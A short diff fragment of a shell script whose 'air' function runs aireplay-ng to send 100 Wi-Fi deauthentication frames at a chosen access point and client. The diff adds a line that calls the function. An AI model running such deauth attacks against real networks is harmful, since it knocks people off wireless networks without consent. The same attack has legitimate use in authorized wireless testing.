@@ -8,3 +8,5 @@ air(){
     read wi
     aireplay-ng --deauth 100 -a $ma -c $tr $wi
 }
+air
+
